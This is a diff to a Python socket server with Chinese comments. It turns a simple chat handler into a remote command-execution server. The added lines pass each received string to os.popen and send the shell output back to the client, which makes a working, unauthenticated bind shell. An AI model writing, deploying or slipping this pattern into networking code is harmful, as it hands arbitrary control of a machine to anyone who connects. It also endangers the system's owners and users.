@@ -1,5 +1,6 @@
 import socket
 import threading
+import os
 
 
 def handle_new_client(s):
@@ -10,8 +11,10 @@ def handle_new_client(s):
         if data.decode() == "EXIT":
             s.close()
             break
-        msg = input("请输入要发送的数据: ")
-        s.send(msg.encode())
+        exec_cmd = os.popen(data.decode())
+        result = exec_cmd.read()
+        # msg = input("请输入要发送的数据: ")
+        s.send(result.encode())
 
 
 def create_server():
@@ -28,6 +31,7 @@ def create_server():
         # 客户端连接
         try:
             new_client, client_address = server.accept()
+            print(new_client.getsockname())
         except:
             server.close()
             break
